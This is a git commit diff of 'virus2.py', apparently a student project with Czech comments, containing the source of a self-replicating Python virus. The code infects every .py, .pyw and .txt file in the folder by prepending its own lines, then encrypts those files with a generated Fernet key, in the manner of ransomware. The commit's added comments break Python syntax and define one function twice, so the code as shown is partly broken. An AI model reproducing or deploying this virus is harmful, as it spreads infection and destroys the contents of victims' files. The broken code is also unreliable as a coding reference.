7d22e94748704b783f61d3875b9c692847f5f02b
MagdalenaHlavicova <75477735+MagdalenaHlavicova@users.noreply.github.com>
2021-02-12 13:28:09 +0100

    Update virus2.py

--- Projekty/Virus/virus2.py
+++ Projekty/Virus/virus2.py
@@ -1,85 +1,102 @@
 #VIRUS MAGDA
 import sys
 import glob
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet   """Implementace symetrické kryptografie"""
 import os
+import threading    """Zajistí, aby mohlo na PC jet více procesů najednou tzn. vytvoření vlákna"""
 
+def Replicate ():  """Tato funkce zajistí replikaci viru"""
 
-Virus = []
+    Virus = []   """Vytvoření prostoru pro uložení kódu viru"""
 
-script = open(sys.argv[0], "r")
-lines = script.readlines()
-script.close()
+    script = open(sys.argv[0], "r")  """Přečtení a uložení probíhajícího skriptu viru"""
+    lines = script.readlines()
+    script.close()        """Zavření skriptu"""
 
-###Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM###
-Nakazeny = False
-for line in lines:
-    if line == "#VIRUS MAGDA":
-        Nakazeny = True
-    if not Nakazeny:
-        Virus.append(line)
-    if line == "# SBOHEM \n":
-        break
-
-###Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)
-###Pokud soubor není nakažený, tak do něj vložíme náš škodlivý kód
-pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')
-for file in pythonSoubory:
-    script = open(file, "r")
-    Kod = script.readlines()
-    script.close()
-
-    Nakazeny = False
-
-    for line in Kod:
-        if line == "#VIRUS MAGDA\n":
-            Nakazeny = True
+    
+    Nakazeny = False  """Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM"""
+    for line in lines:
+        if line == "#VIRUS MAGDA":
+            Nakazeny = True     
+        if not Nakazeny:
+            Virus.append(line)
+        if line == "# SBOHEM \n":
             break
+
+    
+
+    pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')      """Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)"""
+    for file in pythonSoubory:      """Prohledání souborů v infikovaném počítači"""
+        script = open(file, "r")
+        Kod = script.readlines()
+        script.close()
+
+        Nakazeny = False
+
+        for line in Kod:             """Pokud je kód již nakažený, opustíme cyklus"""
+            if line == "#VIRUS MAGDA\n":
+                Nakazeny = True
+                break
             
 
-    if not Nakazeny:
-        NemocnyKod = []
-        NemocnyKod.extend(Virus)
-        NemocnyKod.extend('\n')
-        NemocnyKod.extend(Kod)
+        if not Nakazeny:     """Když kód zatím nakažený není, vložíme do něj náš virus"""
+            NemocnyKod = []
+            NemocnyKod.extend(Virus)
+            NemocnyKod.extend('\n')
+            NemocnyKod.extend(Kod)
 
-        script = open(file, 'w')
-        script.writelines(NemocnyKod)
-        script.close()
-###Zde je náš škodlivý kód
+            script = open(file, 'w')
+            script.writelines(NemocnyKod)
+            script.close()
 
-def write_key():
+
+"""Zde jsou funkce samotného škodlivého kódu, jedná se o zašifrování souborů oběti (symetrické šifrování pomocí Fernet)"""
+
+def DoMaliciousThings():
+	
+	print("You are infected")
+y = threading.Thread(target=Replicate)			
+y.start()							
+x = threading.Thread(target=DoMaliciousThings, daemon=True)	
+x.start()
+
+def write_key():    """Vytvoření symetrického klíče, jež se nám vygeneruje do key souboru key.key"""
    
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
         key_file.write(key)
 
 
-def encrypt(filename, key):
+def encrypt(filename, key):  """Proces  zašifrování"""
    
     f = Fernet(key)
     with open(filename, "rb") as file:
-    # precteme vsechna data
+    """ precteme vsechna data"""
         file_data = file.read()
-    # zasifrujeme data
+    """zasifrujeme data"""
         encrypted_data = f.encrypt(file_data)
-    # vytvorime novy zasifrovany soubor
+    """ vytvorime novy zasifrovany soubor"""
     with open(filename, "wb") as file:
         file.write(encrypted_data)
 
-def load_key():
+def load_key():    """Pro dešifrování potřebujeme stejný kód, kterým jsme soubory zašifrovali, tato funkce nám načte onen vygenerovaný klíč"""
     
     return open("key.key", "rb").read()
 
-#vytvoříme klíč
-write_key()
-#načteme klíč
-key = load_key()
-#projdeme soubory, po nalezení souborů s uvedenými koncovkami dojde k zašifrování
-pythonSoubory2 = glob.glob('*.py') + glob.glob('*.pyw')+ glob.glob('*.txt')
-for file in pythonSoubory2:
-    encrypt (file,key)
-
+def DoMaliciousThings():
+	
+	"""vytvoříme klíč"""
+    write_key()
+    """načteme klíč"""
+    key = load_key()
+    """projdeme soubory, po nalezení souborů s uvedenými koncovkami dojde k zašifrování"""
+    pythonSoubory2 = glob.glob('*.py') + glob.glob('*.pyw')+ glob.glob('*.txt')
+    for file in pythonSoubory2:
+        encrypt (file,key)
+y = threading.Thread(target=Replicate)			
+y.start()							
+x = threading.Thread(target=DoMaliciousThings, daemon=True)	
+x.start()
 
 
 #SBOHEM
